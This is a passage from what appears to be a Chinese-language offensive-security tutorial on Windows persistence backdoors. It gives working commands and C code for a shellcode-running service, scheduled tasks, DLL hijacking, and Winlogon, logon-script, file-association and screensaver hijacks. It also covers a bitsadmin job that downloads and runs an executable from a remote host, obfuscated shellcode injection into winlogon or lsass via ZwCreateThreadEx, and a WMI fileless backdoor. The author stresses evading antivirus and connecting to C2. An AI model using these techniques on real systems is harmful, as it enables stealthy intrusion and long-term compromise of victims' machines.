                SERVICE_STOPPED;
            ServiceStatus.dwWin32ExitCode = -1;
            SetServiceStatus(hStatus, &ServiceStatus);
            return;
        }
        LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(Memory, buf, sizeof(buf));
        ((void(*)())Memory)();
        /*向SCM 报告运行状态*/
        ServiceStatus.dwCurrentState =
            SERVICE_RUNNING;
        SetServiceStatus(hStatus, &ServiceStatus);
        /*do something you want to do in this while loop*/
        MEMORYSTATUS memstatus;
        while (ServiceStatus.dwCurrentState ==
            SERVICE_RUNNING)
        {
            char buffer[16];
            GlobalMemoryStatus(&memstatus);
            int availmb = memstatus.dwAvailPhys / 1024 / 1024;
            sprintf_s(buffer, 100, "available memory is %dMB", availmb);
            int result = WriteToLog(buffer);
            if (result)
            {
                ServiceStatus.dwCurrentState = SERVICE_STOPPED;
                ServiceStatus.dwWin32ExitCode = -1;
                SetServiceStatus(hStatus,
                    &ServiceStatus);
                return;
            }
            Sleep(SLEEP_TIME);
        }
        WriteToLog("service stopped");
        return;
    }
这其实也是psexec的原理:建立连接后创建服务反弹shell
删除服务:
    sc delete "SD"
## 0x04 系统计划任务后门
Windows实现定时任务主要有schtasks与at二种方式:
At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后
每五分钟执行一次
    schtasks /create /sc minute /mo 5   /tn "sd" /tr C:\Windows\System32\cmd.exe
## 0x05 DLL劫持
DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤
LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀
些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL
LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的
DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。
  1. 程序所在⽬录。
  2. 加载 DLL 时所在的当前⽬录。
  3. 系统⽬录即 SYSTEM32 ⽬录。
  4. 16位系统⽬录即 SYSTEM ⽬录。
  5. Windows⽬录。
  6. PATH环境变量中列出的⽬录
dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。
在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls
关于dll劫持的文章有很多,也需要去挖掘,这里推荐一篇文章入门,也是本人写的:
## 0x06 Winlogon用户登录初始化
winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon
进程负责将用户配置文件加载到注册表中:
    HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\
    HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 或可执行文件。
命令行:
    reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  /v "Userinit" /t REG_SZ /d "C:\Windows\system32\cmd.exe," /f
可以powershell一句话更改
    Set-ItemProperty   "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name   Userinit -value "C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe"
## 0x07 Logon Scripts后门
Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。
注册表位置:
    HKEY_CURRENT_USER\Environment
增加键值对
## 0x08 文件关联
文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的"打开方式"进行关联选择。
我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联。
用ftype命令显示或修改用在文件扩展名关联中的文件类型。
修改\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序
修改注册表（管理员权限）：
    reg add "HKCR\txtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "C:\Windows\system32\cmd.exe %1" /f
再打开txt文件打开的是cmd
## 0x09 Bitsadmin
Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“
bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。
window7以上自带
    .\bitsadmin.exe /transfer backdoor /download /priority high "http://192.168.1.106/CM.EXE" C:\1.exe
将文件放入磁盘后，可以通过从“ bitsadmin ”实用程序执行以下命令来实现持久性。
  1. 在创建参数需要作业的名称
  2. 该addfile需要文件的远程位置和本地路径
  3. 该SetNotifyCmdLine将执行的命令
  4. 所述SetMinRetryDelay定义时间回调（秒）
  5. 该简历参数将运行位工作。 
        bitsadmin /create backdoor
    bitsadmin /addfile backdoor "http://192.168.1.106/CM.EXE"  "C:\1.exe"
    bitsadmin /SetNotifyCmdLine backdoorC:\1.exe NUL
    bitsadmin /SetMinRetryDelay "backdoor" 60 
    bitsadmin /resume backdoor
这里只是随便找了个exe测试,如果是c2的马的化可以直接上线
## 0x10 进程注入
之所以把注入也放到权限维持来说,因为注入更加隐蔽,尤其是拿到高权限后,难以被发现
如果是user权限可以考虑注入exploer.exe 如果是system权限则可以注入winlogon或者lassa
记一次实战中的注入,这里是我自己写的小工具
关于dll注入网上已经有很多教程,包括突破session 0,使用ZwCreateThreadEx创建一个线程
同样还有shellcode注入
一个demo
    DWORD CeatRemoThread(DWORD pid)
    {
        HANDLE hThread;
        DWORD dwOldProtect;
        DWORD dwThreadId;
        int shellcode_size = sizeof(buf);
        //混淆
        char* newBuf;
        decrypt(buf, shellcode_size, (LPVOID*)&newBuf);
        HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hHandle == NULL)
        {
            printf("openprocessError");
            free(newBuf);
            return FALSE;
        }
        LPVOID Memory = VirtualAllocEx(hHandle, NULL, sizeof(newBuf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        SIZE_T dwSize = 0;
        WriteProcessMemory(hHandle, Memory, newBuf, shellcode_size / 3, &dwSize);
        //Sleep(3000);
        VirtualProtectEx(hHandle, Memory, shellcode_size / 3, PAGE_EXECUTE, &dwOldProtect);
        HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
        if (hNtdll == NULL)
        {
            printf("[!] LoadNTdll Error,Error is:%d\n", GetLastError());
            return FALSE;
        }
        else
        {
            printf("[*] Load ntdll.dll Successfully!\n");
        }
    #ifdef _WIN64
        typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
            PHANDLE ThreadHandle,
            ACCESS_MASK DesiredAccess,
            LPVOID ObjectAttributes,
            HANDLE ProcessHandle,
            LPTHREAD_START_ROUTINE lpStartAddress,
            LPVOID lpParameter,
            ULONG CreateThreadFlags,
            SIZE_T ZeroBits,
            SIZE_T StackSize,
            SIZE_T MaximumStackSize,
            LPVOID pUnkown
            );
    #else
        typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
            PHANDLE ThreadHandle,
            ACCESS_MASK DesiredAccess,
            LPVOID ObjectAttributes,
            HANDLE ProcessHandle,
            LPTHREAD_START_ROUTINE lpStartAddress,
            LPVOID lpParameter,
            BOOL CreateSuspended,
            DWORD dwStackSize,
            DWORD dw1,
            DWORD dw2,
            LPVOID pUnkown
            );
    #endif 
        typedef_ZwCreateThreadEx ZwCreateThreadEx = NULL;
        ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, "ZwCreateThreadEx");
        if (ZwCreateThreadEx == NULL)
        {
            printf("[!] Get ZwCreateThreadEx Address Error,Error is:%d\n", GetLastError());
            return FALSE;
        }
        else
        {
            printf("[*] Get ZwCreateThreadEx Address Successfully! Address is %x\n", ZwCreateThreadEx);
        }
        HANDLE hRemoteThread = NULL;
        DWORD ZwRet = 0;
        ZwRet = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hHandle,
            (LPTHREAD_START_ROUTINE)Memory, NULL, 0, 0, 0, 0, NULL);
        if (hRemoteThread == NULL)
        {
            printf("[!] Creat RemoteThread Error,Error is:%d\n", GetLastError());
            getchar();
            VirtualFreeEx(hHandle, Memory, 0, MEM_RELEASE);
            CloseHandle(hHandle);
            FreeLibrary(hNtdll);
            return FALSE;
        }
        WaitForSingleObject(hRemoteThread, INFINITE);
        return TRUE;
    }
## 0x11 屏幕保护程序
利用前提:对方开启了屏幕保护
屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。
在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell,达到一定的权限维持。
注册表位置:
    HKEY_CURRENT_USER\Control Panel\Desktop
命令行修改:
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\System32\cmd.exe
这里可以改成我们的马,达到维持权限的效果,具体时间为注册表的ScreenSaverTimeout值有关
## 0x12 WMI构造无文件后门
WMI是一项Windows管理技术，其全称是Windows Management
Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。
无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。
通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。
如果展开讲会讲很久，这里推荐一篇比较详细的文章:
    $filterName = 'SD'
    $consumerName = 'SDD'
    $exePath = 'C:\Windows\System32\cmd.exe'
    $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=200 AND TargetInstance.SystemUpTime   